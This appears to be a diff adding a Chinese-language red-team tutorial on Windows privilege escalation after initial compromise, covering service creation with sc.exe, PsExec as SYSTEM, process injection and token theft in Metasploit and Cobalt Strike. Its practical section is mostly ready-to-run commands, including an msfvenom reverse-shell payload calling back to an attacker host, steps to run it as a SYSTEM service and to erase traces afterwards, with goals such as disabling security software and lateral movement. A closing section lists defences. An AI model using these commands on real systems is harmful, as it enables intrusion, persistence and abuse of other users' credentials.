@@ -1,0 +1,246 @@
+## 1. 概述
+
+本文档旨在详细阐述在后渗透（Post-Exploitation）阶段，针对 Windows 操作系统的几种核心权限提升（Privilege Escalation）与权限操纵（Privilege Manipulation）技术。在真实的攻击与防御场景中，攻击者在通过初始访问（如钓鱼攻击）获得目标主机的初步控制权后，通常仅具备普通用户权限。为了执行更敏感的操作（如安装持久化后门、转储凭据、在域内横向移动），必须将当前权限提升至更高等级，如 `SYSTEM`。同时，在某些场景下，为了与内网其他资源进行交互，也需要从 `SYSTEM` 降权至特定的域用户身份。
+
+本文将重点剖析以下四种关键技术，并结合理论与实践，提供可直接复现的命令与代码示例。
+
+### 1.1. 适用场景
+
+*   **场景一：单机权限巩固**
+    *   在通过钓鱼、漏洞利用等方式获得目标主机的初始访问权限（Shell）后，利用本文技术将权限从普通用户提升至 `SYSTEM`，以便进行深度信息收集、安装持久化后门或关闭安全防护软件。
+*   **场景二：内网横向移动**
+    *   当初始立足点位于一个域环境中时，首先需要提权至 `SYSTEM` 以获取本地系统的完全控制。随后，可能需要窃取或模拟（Impersonate）已登录的域用户令牌，以便使用该用户身份访问网络共享、执行远程命令，从而在内网中进行横向移动。
+
+### 1.2. 技术入口点与应用点
+
+*   **技术入口点**：已通过钓鱼攻击或其他手段获得目标主机的非管理员权限（如 Meterpreter 或 Cobalt Strike Beacon 会话）。
+*   **技术应用点**：
+    *   **提权至 `SYSTEM`**：与本地系统进行深度交互，获取最高权限。
+    *   **降权至域用户**：在已获得 `SYSTEM` 权限后，切换到特定域用户身份，以便在内网环境中进行合规的资源访问和操作。
+
+---
+
+## 2. 技术原理
+
+### 2.1. 服务启动 (sc.exe)
+
+Windows 服务是在后台运行的应用程序，通常由服务控制管理器（Services Control Manager, SCM）负责管理。许多服务默认以 `NT AUTHORITY\SYSTEM` 这个本地最高权限账户运行。`sc.exe` 是一个强大的命令行工具，允许用户创建、查询、启动、停止和删除服务。
+
+**提权原理**：如果当前用户具备创建服务的权限（通常是本地管理员组成员），便可以创建一个新的服务，并将其可执行文件路径（`binPath`）指向我们的恶意程序（如反弹 Shell 的 Payload）。当通过 `sc start` 启动这个服务时，服务控制管理器会以 `SYSTEM` 权限执行该程序，从而实现权限提升。
+
+### 2.2. 远程管理 (PsExec)
+
+`PsExec` 是 Sysinternals 工具套件中的一员，是一款合法的远程管理工具。它通过在远程主机上创建一个名为 `PSEXESVC` 的服务来工作，该服务负责执行用户指定的命令，并将输入输出重定向回本地控制台。
+
+**提权原理**：`PsExec` 的 `-s` 参数指示其在目标系统上以 `SYSTEM` 账户权限运行命令。当我们在本地对自己执行 `psexec -s` 时，它会在本地创建一个以 `SYSTEM` 权限运行的服务，并通过该服务启动一个新的进程（如 `cmd.exe`）。由于新进程继承了父进程（`PSEXESVC` 服务）的安全上下文，因此它也拥有 `SYSTEM` 权限。
+
+### 2.3. 进程注入 (Process Injection)
+
+进程注入是一种将恶意代码注入到另一个正在运行的合法进程地址空间中的技术。其目的是利用目标进程的权限和身份来执行恶意操作，同时隐藏自身。
+
+**提权/降权原理**：
+*   **提权**：如果当前用户权限较低，但能找到一个由更高权限用户（如 `SYSTEM`）运行的进程，并且我们有权限向该进程写入内存和创建远程线程（如 `SeDebugPrivilege`），就可以将我们的 Shellcode 注入该进程。代码执行后，我们将获得与目标进程相同的 `SYSTEM` 权限。
+*   **降权**：如果我们当前是 `SYSTEM` 权限，但需要以某个登录的域用户身份活动，可以找到该域用户启动的进程（如 `explorer.exe`），并将 Shellcode 注入其中。这样，新建立的会话将继承该域用户的身份和网络访问权限。
+
+### 2.4. 令牌窃取 (Token Stealing/Impersonation)
+
+在 Windows 中，每个进程都有一个访问令牌（Access Token），它包含了该进程的安全上下文信息，如用户 SID、用户组和特权。令牌分为主令牌（Primary Token）和模拟令牌（Impersonation Token）。
+
+**提权/降权原理**：
+*   **提权**：如果当前进程拥有 `SeDebugPrivilege` 等高级权限，它就可以打开一个由 `SYSTEM` 账户运行的进程，并复制其访问令牌。然后，通过 `ImpersonateLoggedOnUser` 或 `SetThreadToken` 等 API，将这个窃取来的 `SYSTEM` 令牌应用到我们自己的进程或线程上，从而临时性地将权限提升至 `SYSTEM`。
+*   **降权**：同理，`SYSTEM` 权限的进程可以窃取任意已登录用户的令牌（如域管理员），并模拟该用户身份。这在需要以特定用户身份访问网络资源时非常有用，因为 `SYSTEM` 账户在网络中通常被视为机器账户，访问权限受限。
+
+---
+
+## 3. 环境准备
+
+*   **攻击机**：Kali Linux 或其他装有 Metasploit Framework (MSF) 和相关工具的系统。
+*   **受控机**：Windows 7 / 10 / Server 2012+ 等。
+*   **C2 框架**：Metasploit Framework 或 Cobalt Strike。
+*   **辅助工具**：
+    *   **PsTools**：从 [Microsoft Sysinternals 官网](https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools)下载，并将 `psexec.exe` 上传至受控机。
+    *   **Payload**：使用 `msfvenom` 或其他工具生成与目标架构匹配的 Payload（如 `windows/x64/meterpreter/reverse_tcp`）。
+
+---
+
+## 4. 实战示例
+
+以下示例假设已通过初始攻击获得了一个普通用户权限的 Meterpreter 或 Beacon 会话。
+
+### 4.1. 服务启动提权 (sc)
+
+此方法适用于 Windows 7 及以上版本，通常需要本地管理员权限才能成功创建服务。
+
+1.  **生成并上传 Payload**
+    在攻击机上生成一个可执行文件 Payload，并上传到受控机的可写目录（如 `C:\Windows\Temp\`）。
+
+    ```bash
+    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o syscmd.exe
+    ```
+
+2.  **创建服务**
+    在受控机的 Shell 中执行以下命令，创建一个名为 `syscmd` 的服务，其可执行文件指向我们上传的 Payload。
+
+    ```powershell
+    # 注意：binPath= 后面必须有一个空格，这是 sc 命令的语法要求
+    sc Create syscmd binPath= "C:\Windows\Temp\syscmd.exe"
+    ```
+
+3.  **启动服务并接收会话**
+    在攻击机上设置好监听，然后在受控机上启动服务。服务将以 `SYSTEM` 权限执行 `syscmd.exe`，攻击机将收到一个新的 `SYSTEM` 权限会话。
+
+    ```powershell
+    sc start syscmd
+    ```
+
+    成功后，可以清理服务以抹除痕迹：
+
+    ```powershell
+    sc delete syscmd
+    ```
+
+### 4.2. 远程管理提权 (PsExec)
+
+此方法同样需要本地管理员权限，并且需要将 `psexec.exe` 上传到目标机器。
+
+1.  **上传 PsExec**
+    将下载好的 `psexec.exe` 上传到受控机的 `C:\Windows\Temp\` 目录。
+
+2.  **执行提权命令**
+    在受控机的 Shell 中，执行以下命令。`PsExec` 会以 `SYSTEM` 权限启动一个新的 `cmd.exe`。
+
+    ```powershell
+    # -accepteula: 自动接受许可协议
+    # -s: 以 SYSTEM 账户运行
+    # -i: 在交互式桌面运行（如果需要图形界面）
+    # -d: 不等待进程结束直接返回
+    C:\Windows\Temp\psexec.exe -accepteula -s -i -d cmd.exe
+    ```
+    如果想直接获得一个 `SYSTEM` 权限的 Meterpreter 会话，可以将 `cmd.exe` 替换为 Payload 的路径。
+
+    ```powershell
+    C:\Windows\Temp\psexec.exe -accepteula -s -d C:\Windows\Temp\syscmd.exe
+    ```
+
+### 4.3. 进程注入 (MSF & CS)
+
+此方法依赖于找到一个合适的目标进程进行注入。
+
+#### Metasploit (MSF)
+
+1.  **查看进程列表**
+    在 Meterpreter 会话中，使用 `ps` 命令列出所有正在运行的进程，寻找一个高权限进程（如 `services.exe`、`winlogon.exe`）。
+
+    ```powershell
+    meterpreter > ps
+    ```
+
+2.  **迁移进程**
+    使用 `migrate` 命令将当前 Meterpreter 会话注入到目标进程。例如，迁移到 PID 为 780 的 `services.exe` 进程。
+
+    ```powershell
+    meterpreter > migrate 780
+    [*] Migrating from 1234 to 780...
+    [*] Migration completed successfully.
+    meterpreter > getuid
+    Server username: NT AUTHORITY\SYSTEM
+    ```
+
+#### Cobalt Strike (CS)
+
+1.  **查看进程列表**
+    在 Beacon 会话中，使用 `ps` 命令或通过图形界面查看进程列表。
+
+    ```powershell
+    beacon> ps
+    ```
+
+2.  **注入进程**
+    使用 `inject` 命令将一个新的 Beacon Payload 注入到目标进程中，从而派生一个具有该进程权限的新会话。
+
+    ```powershell
+    # 选择一个 x64 的监听器，并注入到 PID 为 780 的进程中
+    beacon> inject 780 x64
+    ```
+
+### 4.4. 令牌窃取 (MSF & CS)
+
+此方法需要当前进程拥有 `SeDebugPrivilege` 权限，通常本地管理员默认拥有。
+
+#### Metasploit (MSF)
+
+1.  **加载 `incognito` 模块**
+    `incognito` 是一个专门用于令牌操纵的模块。
+
+    ```powershell
+    meterpreter > use incognito
+    ```
+
+2.  **列出可用令牌**
+    使用 `list_tokens -u` 列出系统中可用的用户令牌。
+
+    ```powershell
+    meterpreter > list_tokens -u
+
+    Delegation Tokens Available
+    ========================================
+    NT AUTHORITY\SYSTEM
+    WIN-SERVER\Administrator
+    ```
+
+3.  **模拟 `SYSTEM` 令牌**
+    使用 `impersonate_token` 命令模拟 `SYSTEM` 令牌。注意，令牌名称需要用双引号括起来。
+
+    ```powershell
+    meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
+    [+] Delegated token from NT AUTHORITY\SYSTEM to current thread.
+    meterpreter > getuid
+    Server username: NT AUTHORITY\SYSTEM
+    ```
+    操作完成后，可使用 `rev2self` 命令恢复到原始令牌。
+
+#### Cobalt Strike (CS)
+
+1.  **查看进程并窃取令牌**
+    首先使用 `ps` 找到一个 `SYSTEM` 权限的进程，然后使用 `steal_token` 命令窃取其令牌。
+
+    ```powershell
+    beacon> ps
+    # 假设 PID 780 是一个 SYSTEM 进程
+    beacon> steal_token 780
+    [+] Impersonated NT AUTHORITY\SYSTEM
+    ```
+
+2.  **使用窃取的令牌派生新会话**
+    `spawnu` 命令允许你指定一个父进程的 PID，它会窃取该父进程的令牌，并用这个令牌生成一个新的会话。这是一种更稳定和隐蔽的方式。
+
+    ```powershell
+    # 窃取 PID 780 的令牌，并派生一个新的 Beacon 会话
+    beacon> spawnu 780
+    ```
+
+---
+
+## 5. 关键细节与补充
+
+*   **`sc` 命令的空格**：`sc Create` 命令的 `binPath=` 参数后面必须跟一个空格，否则命令会失败。这是一个常见的语法陷阱。
+*   **架构匹配**：在进行进程注入时，务必确保 Payload 的架构（x86/x64）与目标进程的架构一致，否则注入会失败。
+*   **`SeDebugPrivilege`**：进程注入和令牌窃取通常需要 `SeDebugPrivilege` 权限。即使是管理员账户，也可能需要手动启用此权限。在 Meterpreter 中，可以使用 `getprivs` 查看并尝试启用。
+*   **VShell 与 QEMU**：在某些跨架构的场景中（例如在 x86 攻击机上为 ARM 目标编译工具），可能会遇到 `exec format error`。这通常意味着二进制文件的架构不匹配。在基于 Debian/Ubuntu 的系统上，可以通过安装 `qemu-user-static` 来获得对多种架构二进制文件的执行支持，从而解决此问题。
+    ```bash
+    sudo apt update
+    sudo apt install qemu-user-static
+    ```
+
+---
+
+## 6. 安全总结与防御建议
+
+权限提升是攻击链中至关重要的一环。理解其原理有助于我们更好地进行防御和检测。
+
+*   **最小权限原则**：确保普通用户和服务账户仅拥有其完成任务所必需的最小权限。避免使用管理员账户运行日常应用程序。
+*   **服务权限硬化**：严格控制用户创建和修改服务的权限。审计系统上运行的服务，确保其可执行文件路径和权限配置正确，防止被恶意替换。
+*   **用户账户控制 (UAC)**：虽然 UAC 可以被绕过，但它仍然是防御低水平提权攻击的第一道防线。建议始终将其设置为最高级别。
+*   **进程监控与行为分析**：部署 EDR（端点检测与响应）解决方案，监控异常的进程创建、跨进程内存写入（进程注入）和令牌操纵行为。例如，一个非系统进程派生出一个 `SYSTEM` 权限的 `cmd.exe` 是一个强烈的告警信号。
+*   **补丁管理**：许多权限提升漏洞源于内核或系统服务的缺陷。及时安装安全补丁是根除这类漏洞的最有效方法。
+*   **攻击面削减**：禁用或卸载不必要的服务和工具（如 `PsExec`），减少攻击者可以利用的合法工具。
